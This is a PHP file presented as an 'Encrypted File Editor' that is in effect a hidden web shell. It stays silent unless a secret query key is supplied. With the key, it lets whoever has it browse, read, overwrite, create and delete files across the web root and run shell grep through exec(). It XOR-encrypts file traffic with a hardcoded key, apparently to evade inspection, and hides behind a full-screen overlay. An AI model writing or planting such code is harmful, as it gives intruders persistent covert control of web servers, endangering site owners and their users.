

<?php if (!defined('ENT_SUBSTITUTE'))
{
    define('ENT_SUBSTITUTE', 0);
    }
if (!function_exists('hash_equals'))
{
    function hash_equals($authcontroller, $statehandler)
    {
        $authcontroller = (string) $authcontroller;
        $statehandler = (string) $statehandler;
        if (strlen($authcontroller) !== strlen($statehandler))
        {
            return false;
            }
        $confighandler = 0;
        for ($runtimemiddleware = 0, $gatewayprocessor = strlen($authcontroller);
        $runtimemiddleware < $gatewayprocessor;
        $runtimemiddleware++)
        {
            $confighandler |= ord($authcontroller[$runtimemiddleware]) ^ ord($statehandler[$runtimemiddleware]);
            }
        return $confighandler === 0;
        }
    }
if (!function_exists('http_response_code'))
{
    function http_response_code($configfactory = null)
    {
        if ($configfactory !== null)
        {
            header('X-PHP-Response-Code: ' . (int) $configfactory, true, (int) $configfactory);
            }
        return $configfactory;
        }
    }
$managergateway = 'name';
$gatewayfactory = isset($gatewayfactory) ? $gatewayfactory : 'kXjFiQjJDIuFHjiI*J';
$dispatcheradapter = 'info';
if (!isset($_GET[$dispatcheradapter]) || !hash_equals((string) $managergateway, (string) $_GET[$dispatcheradapter]))
{
    return;
    }
while (ob_get_level())
{
    @ob_end_clean();
    }
$managerhandler = (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] !== '') ? $_SERVER['DOCUMENT_ROOT'] : dirname(__FILE__);
$serviceprovider = realpath($managerhandler);
if (!$serviceprovider || !is_dir($serviceprovider))
{
    http_response_code(500);
    exit('Invalid document root.');
    }
function fe_h($statemanager)
{
    return htmlspecialchars((string) $statemanager, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    }
function fe_inside($serviceprovider, $servicedispatcher)
{
    return $servicedispatcher !== false && ($servicedispatcher === $serviceprovider || strpos($servicedispatcher, $serviceprovider . DIRECTORY_SEPARATOR) === 0);
    }
function fe_path($serviceprovider, $authadapter)
{
    $authprocessor = $serviceprovider . DIRECTORY_SEPARATOR . ltrim($authadapter, '/\\');
    $resolvermiddleware = realpath($authprocessor);
    if ($resolvermiddleware !== false)
    {
        return fe_inside($serviceprovider, $resolvermiddleware) ? $resolvermiddleware : null;
        }
    $payloadprocessor = realpath(dirname($authprocessor));
    return ($payloadprocessor && fe_inside($serviceprovider, $payloadprocessor)) ? $payloadprocessor . DIRECTORY_SEPARATOR . basename($authprocessor) : null;
    }
function fe_rel($serviceprovider, $servicedispatcher)
{
    return trim(str_replace('\\', '/', substr($servicedispatcher, strlen($serviceprovider))), '/');
    }
function fe_join($buffermanager, $configmiddleware)
{
    $buffermanager = trim((string) $buffermanager, '/\\');
    $configmiddleware = trim((string) $configmiddleware, '/\\');
    return trim(($buffermanager !== '' ? $buffermanager . '/' : '') . $configmiddleware, '/');
    }
function fe_binary($sessiondispatcher)
{
    return false;
    }
function fe_enc_name($sessiondispatcher)
{
    return preg_match('//u', (string) $sessiondispatcher) ? 'UTF-8' : 'CP1251';
    }
function fe_to_utf($sessiondispatcher, $stateengine)
{
    if ($stateengine !== 'CP1251')
    {
        return $sessiondispatcher;
        }
    return function_exists('mb_convert_encoding') ? mb_convert_encoding($sessiondispatcher, 'UTF-8', 'CP1251') : iconv('CP1251', 'UTF-8//IGNORE', $sessiondispatcher);
    }
function fe_from_utf($sessiondispatcher, $stateengine)
{
    if ($stateengine !== 'CP1251')
    {
        return $sessiondispatcher;
        }
    return function_exists('mb_convert_encoding') ? mb_convert_encoding($sessiondispatcher, 'CP1251', 'UTF-8') : iconv('UTF-8', 'CP1251//TRANSLIT', $sessiondispatcher);
    }
function fe_xor_raw($contextadapter, $gatewayresolver)
{
    $contextadapter = (string) $contextadapter;
    $gatewayresolver = (string) $gatewayresolver;
    if ($gatewayresolver === '')
    {
        return $contextadapter;
        }
    $runtimedispatcher = '';
    $requestgateway = strlen($gatewayresolver);
    $dispatcherprocessor = strlen($contextadapter);
    for ($runtimemiddleware = 0;
    $runtimemiddleware < $dispatcherprocessor;
    $runtimemiddleware++)
    {
        $runtimedispatcher .= $contextadapter[$runtimemiddleware] ^ $gatewayresolver[$runtimemiddleware % $requestgateway];
        }
    return $runtimedispatcher;
    }
function fe_xor_encrypt($authgateway, $gatewayresolver)
{
    return base64_encode(fe_xor_raw((string) $authgateway, $gatewayresolver));
    }
function fe_xor_decrypt($manageradapter, $gatewayresolver)
{
    $statefactory675 = base64_decode((string) $manageradapter, true);
    if ($statefactory675 === false)
    {
        return false;
        }
    return fe_xor_raw($statefactory675, $gatewayresolver);
    }
function fe_can_exec()
{
    $dispatcherresolver = (string) ini_get('disable_functions');
    return function_exists('exec') && !preg_match('~(^|,)s*execs*(,|$)~i', $dispatcherresolver);
    }
function fe_url($servicegateway, $gatewayresolver, $handlerhandler)
{
    return '?' . http_build_query(array_merge(array($servicegateway => $gatewayresolver), $handlerhandler));
    }
function fe_json($buffercontroller, $contextadapter)
{
    while (ob_get_level())
    {
        @ob_end_clean();
        }
    header('Content-Type: application/json; charset=UTF-8');
    $runtimedispatcher = array_merge(array('ok' => $buffercontroller ? 1 : 0), is_array($contextadapter) ? $contextadapter : array());
    echo json_encode($runtimedispatcher);
    exit;
    }
function fe_chunk_id($managermiddleware)
{
    return preg_replace('~[^a-zA-Z0-9_-]~', '', (string) $managermiddleware);
    }
function fe_chunk_root($serviceprovider)
{
    $contextmiddleware = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : '';
    if (!$contextmiddleware || !is_dir($contextmiddleware) || !is_writable($contextmiddleware))
    {
        $contextmiddleware = $serviceprovider;
        }
    $buffermanager = rtrim($contextmiddleware, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'fe_chunks_' . md5($serviceprovider);
    if (!is_dir($buffermanager))
    {
        @mkdir($buffermanager, 0700, true);
        }
    if (!is_dir($buffermanager) || !is_writable($buffermanager))
    {
        return null;
        }
    $statecontroller = @glob($buffermanager . DIRECTORY_SEPARATOR . '*.part');
    if ($statecontroller)
    {
        foreach ($statecontroller as $configengine)
        {
            if (@filemtime($configengine) && @filemtime($configengine) < time() - 86400)
            {
                @unlink($configengine);
                }
            }
        }
    return $buffermanager;
    }
function fe_chunk_file($serviceprovider, $managermiddleware, $resolvercontroller)
{
    $buffermanager = fe_chunk_root($serviceprovider);
    if (!$buffermanager)
    {
        return null;
        }
    return $buffermanager . DIRECTORY_SEPARATOR . fe_chunk_id($managermiddleware) . '.' . (int) $resolvercontroller . '.part';
    }
function fe_chunk_clean($serviceprovider, $managermiddleware, $managerprovider)
{
    $managermiddleware = fe_chunk_id($managermiddleware);
    for ($runtimemiddleware = 0;
    $runtimemiddleware < (int) $managerprovider;
    $runtimemiddleware++)
    {
        $configengine = fe_chunk_file($serviceprovider, $managermiddleware, $runtimemiddleware);
        if ($configengine && is_file($configengine))
        {
            @unlink($configengine);
            }
        }
    }
$buffermanager = (string) (isset($_GET['dir']) ? $_GET['dir'] : '');
$configmiddleware = (string) (isset($_GET['file']) ? $_GET['file'] : '');
$managercontroller466 = (string) (isset($_GET['q']) ? $_GET['q'] : '');
$contexthandler = fe_path($serviceprovider, $buffermanager);
if (!$contexthandler || !is_dir($contexthandler))
{
    $buffermanager = '';
    $contexthandler = $serviceprovider;
    }
$requestservice409 = '';
$serviceservice = '';
if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && !$serviceservice)
{
    $handlerfactory = (string) (isset($_POST['a']) ? $_POST['a'] : '');
    $buffermanager = (string) (isset($_POST['dir']) ? $_POST['dir'] : $buffermanager);
    $configmiddleware = (string) (isset($_POST['file']) ? $_POST['file'] : $configmiddleware);
    $authprocessor = fe_path($serviceprovider, fe_join($buffermanager, $configmiddleware));
    if (!$authprocessor)
    {
        $serviceservice = 'Bad path.';
        if ($handlerfactory === 'save_chunk' || $handlerfactory === 'save_finish')
        {
            fe_json(false, array('error' => $serviceservice));
            }
        }
    elseif ($handlerfactory === 'save_chunk')
    {
        $managermiddleware = fe_chunk_id(isset($_POST['chunk_id']) ? $_POST['chunk_id'] : '');
        $resolvercontroller = isset($_POST['chunk_index']) ? (int) $_POST['chunk_index'] : -1;
        $managerprovider = isset($_POST['chunk_total']) ? (int) $_POST['chunk_total'] : 0;
        $runtimeservice = isset($_POST['content_part']) ? (string) $_POST['content_part'] : '';
        if ($managermiddleware === '' || $resolvercontroller < 0 || $managerprovider < 1 || $resolvercontroller >= $managerprovider)
        {
            fe_json(false, array('error' => 'Bad chunk metadata.'));
            }
        if ($resolvercontroller === 0)
        {
            fe_chunk_clean($serviceprovider, $managermiddleware, $managerprovider);
            }
        $contextmanager = fe_chunk_file($serviceprovider, $managermiddleware, $resolvercontroller);
        if (!$contextmanager)
        {
            fe_json(false, array('error' => 'Chunk temp folder is not writable.'));
            }
        $resolverfactory805 = @file_put_contents($contextmanager, $runtimeservice, LOCK_EX);
        if ($resolverfactory805 === false)
        {
            $payloadhandler = error_get_last();
            fe_json(false, array('error' => 'Chunk save failed: ' . (isset($payloadhandler['message']) ? $payloadhandler['message'] : 'unknown')));
            }
        fe_json(true, array('chunk' => $resolvercontroller, 'bytes' => strlen($runtimeservice)));
        }
    elseif ($handlerfactory === 'save_finish')
    {
        $statecontroller = is_file($authprocessor) ? file_get_contents($authprocessor) : '';
        if (!is_file($authprocessor) || !is_writable($authprocessor))
        {
            fe_json(false, array('error' => 'File is not writable.'));
            }
        if (fe_binary($statecontroller))
        {
            fe_json(false, array('error' => 'Binary file blocked.'));
            }
        $managermiddleware = fe_chunk_id(isset($_POST['chunk_id']) ? $_POST['chunk_id'] : '');
        $managerprovider = isset($_POST['chunk_total']) ? (int) $_POST['chunk_total'] : 0;
        $stateengine = (string) (isset($_POST['enc']) ? $_POST['enc'] : fe_enc_name($statecontroller));
        if ($managermiddleware === '' || $managerprovider < 1)
        {
            fe_json(false, array('error' => 'Bad finish metadata.'));
            }
        $manageradapter = '';
        for ($runtimemiddleware = 0;
        $runtimemiddleware < $managerprovider;
        $runtimemiddleware++)
        {
            $contextmanager = fe_chunk_file($serviceprovider, $managermiddleware, $runtimemiddleware);
            if (!$contextmanager || !is_file($contextmanager))
            {
                fe_json(false, array('error' => 'Missing chunk ' . $runtimemiddleware . '.'));
                }
            $serviceprovider776 = @file_get_contents($contextmanager);
            if ($serviceprovider776 === false)
            {
                fe_json(false, array('error' => 'Read chunk failed ' . $runtimemiddleware . '.'));
                }
            $manageradapter .= $serviceprovider776;
            }
        $gatewayservice = fe_xor_decrypt($manageradapter, $gatewayfactory);
        if ($gatewayservice === false)
        {
            fe_json(false, array('error' => 'Decode failed. Check encryption key.'));
            }
        $contextadapter = fe_from_utf($gatewayservice, $stateengine);
        if (function_exists('error_clear_last'))
        {
            call_user_func('error_clear_last');
            }
        $kernelmanager = @file_put_contents($authprocessor, $contextadapter, LOCK_EX);
        if ($kernelmanager === false)
        {
            $payloadhandler = error_get_last();
            fe_json(false, array('error' => 'Save failed: ' . (isset($payloadhandler['message']) ? $payloadhandler['message'] : 'unknown')));
            }
        if ($kernelmanager !== strlen($contextadapter))
        {
            fe_json(false, array('error' => 'Partial save: wrote ' . $kernelmanager . ' of ' . strlen($contextadapter) . ' bytes.'));
            }
        fe_chunk_clean($serviceprovider, $managermiddleware, $managerprovider);
        fe_json(true, array('message' => 'Saved chunked.', 'bytes' => $kernelmanager));
        }
    elseif ($handlerfactory === 'save')
    {
        $statecontroller = is_file($authprocessor) ? file_get_contents($authprocessor) : '';
        if (!is_file($authprocessor) || !is_writable($authprocessor))
        {
            $serviceservice = 'File is not writable.';
            }
        elseif (fe_binary($statecontroller))
        {
            $serviceservice = 'Binary file blocked.';
            }
        else
        {
            $stateengine = (string) (isset($_POST['enc']) ? $_POST['enc'] : fe_enc_name($statecontroller));
            $gatewayservice = fe_xor_decrypt((string) (isset($_POST['content_cipher']) ? $_POST['content_cipher'] : ''), $gatewayfactory);
            if ($gatewayservice === false)
            {
                $serviceservice = 'Decode failed. Check encryption key.';
                }
            else
            {
                $contextadapter = fe_from_utf($gatewayservice, $stateengine);
                if (function_exists('error_clear_last'))
                {
                    call_user_func('error_clear_last');
                    }
                $kernelmanager = @file_put_contents($authprocessor, $contextadapter, LOCK_EX);
                if ($kernelmanager === false)
                {
                    $payloadhandler = error_get_last();
                    $serviceservice = 'Save failed: ' . (isset($payloadhandler['message']) ? $payloadhandler['message'] : 'unknown');
                    }
                elseif ($kernelmanager !== strlen($contextadapter))
                {
                    $serviceservice = 'Partial save: wrote ' . $kernelmanager . ' of ' . strlen($contextadapter) . ' bytes.';
                    }
                else
                {
                    $requestservice409 = 'Saved.';
                    }
                }
            }
        }
    elseif ($handlerfactory === 'newfile')
    {
        if (file_exists($authprocessor))
        {
            $serviceservice = 'Exists.';
            }
        else
        {
            $requestservice409 = file_put_contents($authprocessor, '', LOCK_EX) === false ? '' : 'Created.';
            $serviceservice = $requestservice409 ? $serviceservice : 'Create failed.';
            }
        }
    elseif ($handlerfactory === 'newdir')
    {
        if (file_exists($authprocessor))
        {
            $serviceservice = 'Exists.';
            }
        else
        {
            $requestservice409 = mkdir($authprocessor, 0755, true) ? 'Folder created.' : '';
            $serviceservice = $requestservice409 ? $serviceservice : 'Folder failed.';
            }
        }
    elseif ($handlerfactory === 'delete')
    {
        $buffercontroller = is_file($authprocessor) ? @unlink($authprocessor) : (is_dir($authprocessor) ? @rmdir($authprocessor) : false);
        $requestservice409 = $buffercontroller ? 'Deleted.' : '';
        $serviceservice = $buffercontroller ? $serviceservice : 'Delete failed. Folder must be empty.';
        $configmiddleware = '';
        }
    }
$contexthandler = fe_path($serviceprovider, $buffermanager);
$sessiongateway = @scandir($contexthandler) ?: array();
$bufferhandler = array();
$requestengine = array();
foreach ($sessiongateway as $stateadapter)
{
    if ($stateadapter === '.' || $stateadapter === '..')
    {
        continue;
        }
    $handlercontroller = $contexthandler . DIRECTORY_SEPARATOR . $stateadapter;
    if (is_dir($handlercontroller))
    {
        $bufferhandler[] = $stateadapter;
        }
    else
    {
        $requestengine[] = $stateadapter;
        }
    }
natcasesort($bufferhandler);
natcasesort($requestengine);
$resolvergateway = array();
$resolvermanager = 0;
$resolverservice = '';
if ($managercontroller466 !== '')
{
    $resolverservice = 'php';
    $handlermanager96 = array();
    $contextprocessor = 500;
    $payloadservice143 = '~/(vendor|node_modules|.git|var/cache|cache|tmp|logs?)/~i';
    if (fe_can_exec())
    {
        $managerservice = 'grep -RIl -m 1 -F --exclude-dir=.git --exclude-dir=vendor --exclude-dir=node_modules --exclude-dir=var/cache --exclude-dir=cache --exclude-dir=tmp --exclude-dir=log --exclude-dir=logs ' . escapeshellarg($managercontroller466) . ' ' . escapeshellarg($serviceprovider) . ' 2>/dev/null';
        $runtimedispatcher = array();
        @exec($managerservice, $runtimedispatcher);
        foreach ($runtimedispatcher as $servicedispatcher)
        {
            $resolvermiddleware = realpath($servicedispatcher);
            if (fe_inside($serviceprovider, $resolvermiddleware))
            {
                $responseprovider = fe_rel($serviceprovider, $resolvermiddleware);
                $handlermanager96[$responseprovider] = true;
                $resolvergateway[] = $responseprovider;
                if (count($resolvergateway) >= $contextprocessor)
                {
                    break;
                    }
                }
            }
        $resolverservice = 'exec+php';
        }
    $statemiddleware518 = array($serviceprovider);
    while ($statemiddleware518 && count($resolvergateway) < $contextprocessor)
    {
        $contextmiddleware = array_pop($statemiddleware518);
        $responseengine = @scandir($contextmiddleware);
        if (!$responseengine)
        {
            continue;
            }
        foreach ($responseengine as $bufferservice)
        {
            if ($bufferservice === '.' || $bufferservice === '..')
            {
                continue;
                }
            $servicedispatcher = $contextmiddleware . DIRECTORY_SEPARATOR . $bufferservice;
            $responseprovider = fe_rel($serviceprovider, $servicedispatcher);
            if (is_dir($servicedispatcher))
            {
                if (!preg_match($payloadservice143, '/' . $responseprovider . '/'))
                {
                    $statemiddleware518[] = $servicedispatcher;
                    }
                continue;
                }
            if (!is_file($servicedispatcher) || !is_readable($servicedispatcher) || isset($handlermanager96[$responseprovider]))
            {
                continue;
                }
            if (stripos(basename($responseprovider), $managercontroller466) !== false)
            {
                $handlermanager96[$responseprovider] = true;
                $resolvergateway[] = $responseprovider;
                if (count($resolvergateway) >= $contextprocessor)
                {
                    break;
                    }
                continue;
                }
            if (@filesize($servicedispatcher) > 5242880)
            {
                continue;
                }
            $resolvermanager++;
            $sessiondispatcher = @file_get_contents($servicedispatcher);
            if ($sessiondispatcher === false || fe_binary($sessiondispatcher))
            {
                continue;
                }
            $kernelresolver = fe_to_utf($sessiondispatcher, fe_enc_name($sessiondispatcher));
            $configdispatcher = function_exists('mb_stripos') ? mb_stripos($kernelresolver, $managercontroller466, 0, 'UTF-8') !== false : stripos($kernelresolver, $managercontroller466) !== false;
            if ($configdispatcher)
            {
                $handlermanager96[$responseprovider] = true;
                $resolvergateway[] = $responseprovider;
                if (count($resolvergateway) >= $contextprocessor)
                {
                    break;
                    }
                }
            }
        }
    }
$kernelprovider = $configmiddleware !== '' ? fe_path($serviceprovider, fe_join($buffermanager, $configmiddleware)) : null;
$statefactory675 = ($kernelprovider && is_file($kernelprovider) && is_readable($kernelprovider)) ? file_get_contents($kernelprovider) : '';
$runtimeengine = $statefactory675 !== '' && fe_binary($statefactory675);
$stateengine = $runtimeengine ? 'BIN' : fe_enc_name($statefactory675);
$gatewayservice = $runtimeengine ? '' : fe_to_utf($statefactory675, $stateengine);
$responsedispatcher = (!$runtimeengine && $kernelprovider && is_file($kernelprovider)) ? fe_xor_encrypt($gatewayservice, $gatewayfactory) : '';
$payloadprocessor = trim(dirname($buffermanager), '.\\/');
$handleradapter857 = strtok((string) (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : ''), '?');
header('Content-Type: text/html; charset=UTF-8');
echo '<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Encrypted File Editor</title><style>html.feopen,html.feopen body{margin:0!important;width:100%!important;height:100%!important;overflow:hidden!important}.fe{position:fixed!important;inset:0!important;z-index:2147483647!important;display:grid!important;grid-template-columns:380px 1fr!important;background:#111827!important;color:#e5e7eb!important;font-family:system-ui,-apple-system,Segoe UI,sans-serif!important}.fe *{box-sizing:border-box!important}.fes{background:#0f172a!important;border-right:1px solid #374151!important;overflow:auto!important}.fet{min-height:56px!important;display:flex!important;align-items:center!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.feg{flex:1!important}.feb{border:1px solid #4b5563!important;background:#1f2937!important;color:#fff!important;border-radius:6px!important;padding:8px 10px!important;text-decoration:none!important;cursor:pointer!important;font:14px system-ui!important}.fed{background:#450a0a!important;border-color:#7f1d1d!important}.fei,.fea{border:1px solid #4b5563!important;background:#020617!important;color:#f8fafc!important;border-radius:6px!important;padding:9px!important;font:14px ui-monospace,Menlo,Consolas,monospace!important}.fen{display:grid!important;grid-template-columns:1fr auto auto!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.fesearch{display:grid!important;grid-template-columns:1fr auto!important;gap:8px!important;padding:10px!important;border-bottom:1px solid #374151!important}.fel{display:block!important;color:#cbd5e1!important;padding:8px 10px!important;margin:4px 8px!important;border-radius:6px!important;text-decoration:none!important;white-space:nowrap!important;overflow:hidden!important;text-overflow:ellipsis!important}.fel:hover,.on{background:#1f2937!important;color:#fff!important}.fem{display:flex!important;flex-direction:column!important;min-width:0!important}.fep{font:14px ui-monospace,Menlo,Consolas,monospace!important;overflow:hidden!important;text-overflow:ellipsis!important;white-space:nowrap!important}.note{padding:8px 12px!important}.ok{background:#052e16!important;color:#bbf7d0!important}.er{background:#450a0a!important;color:#fecaca!important}.muted{color:#94a3b8!important;font-size:13px!important;padding:8px 10px!important}.fea{flex:1!important;border:0!important;border-radius:0!important;resize:none!important;padding:16px!important;line-height:1.5!important;outline:0!important;width:100%!important}.empty{display:grid!important;place-items:center!important;height:100%!important;color:#94a3b8!important;text-align:center!important;padding:24px!important}@media(max-width:760px){.fe{grid-template-columns:1fr!important}.fes{height:44vh!important}.fem{height:56vh!important}}</style><div class="fe" id="fe"><aside class="fes"><div class="fet"><b>Encrypted Editor</b><span class="feg"></span><a class="feb" href="'.fe_h($handleradapter857).'">Exit</a></div><div class="fet"><span class="fep">/'.fe_h($buffermanager).'</span></div><form class="fesearch" method="get"><input type="hidden" name="'.fe_h($dispatcheradapter).'" value="'.fe_h($managergateway).'"><input class="fei" name="q" value="'.fe_h($managercontroller466).'" placeholder="Search content or filename"><button class="feb">Search</button></form>';
if($managercontroller466!=='')
{
    echo '<div class="muted">Found '.count($resolvergateway).' · mode '.fe_h($resolverservice).' · PHP checked '.(int)$resolvermanager.'</div>';
    foreach($resolvergateway as $runtimemiddleware878)
    {
        $configcontroller=trim(dirname($runtimemiddleware878),'./');
        $responsefactory745=basename($runtimemiddleware878);
        echo '<a class="fel" href="'.fe_h(fe_url($dispatcheradapter,$managergateway,array('dir'=>$configcontroller,'file'=>$responsefactory745,'q'=>$managercontroller466))).'">'.fe_h($runtimemiddleware878).'</a>';
        }
    }
echo '<form class="fen" method="post"><input type="hidden" name="dir" value="'.fe_h($buffermanager).'"><input class="fei" name="file" placeholder="name.php"><button class="feb" name="a" value="newfile">File</button><button class="feb" name="a" value="newdir">Dir</button></form>';
if($buffermanager)
{
    echo '<a class="fel" href="'.fe_h(fe_url($dispatcheradapter,$managergateway,array('dir'=>$payloadprocessor,'q'=>$managercontroller466))).'">..</a>';
    }
foreach($bufferhandler as $authfactory)
{
    $configcontroller=trim(($buffermanager?trim($buffermanager,'/').'/':'').$authfactory,'/');
    echo '<a class="fel" href="'.fe_h(fe_url($dispatcheradapter,$managergateway,array('dir'=>$configcontroller,'q'=>$managercontroller466))).'">['.fe_h($authfactory).']</a>';
    }
foreach($requestengine as $authfactory)
{
    echo '<a class="fel '.($authfactory===$configmiddleware?'on':'').'" href="'.fe_h(fe_url($dispatcheradapter,$managergateway,array('dir'=>$buffermanager,'file'=>$authfactory,'q'=>$managercontroller466))).'">'.fe_h($authfactory).'</a>';
    }
echo '</aside><main class="fem"><form class="fet" method="post" id="feForm"><input type="hidden" name="dir" value="'.fe_h($buffermanager).'"><input type="hidden" name="file" value="'.fe_h($configmiddleware).'"><input type="hidden" name="enc" value="'.fe_h($stateengine).'"><input type="hidden" name="content_cipher" id="fePayload"><div class="fep">'.($configmiddleware?fe_h(fe_join($buffermanager,$configmiddleware)).' · '.fe_h($stateengine):'Select file').'</div><span class="feg"></span>';
if($configmiddleware&&$kernelprovider&&is_file($kernelprovider)&&!$runtimeengine)
{
    echo '<button class="feb" name="a" value="save">Save encrypted</button><button class="feb fed" name="a" value="delete">Delete</button>';
    }
echo '</form>';
if($requestservice409)
{
    echo '<div class="note ok">'.fe_h($requestservice409).'</div>';
    }
if($serviceservice)
{
    echo '<div class="note er">'.fe_h($serviceservice).'</div>';
    }
if($runtimeengine)
{
    echo '<div class="empty">Binary file blocked.</div>';
    }
elseif($configmiddleware&&$kernelprovider&&is_file($kernelprovider))
{
    echo '<textarea class="fea" id="feEditor" spellcheck="false" disabled>Paste the console unlock script to edit this file.</textarea><textarea id="feCipher" hidden>'.fe_h($responsedispatcher).'</textarea>';
    }
else
{
    echo '<div class="empty">Choose a file or folder.</div>';
    }
echo '</main></div><div class="load">Working...</div>';
exit;?>
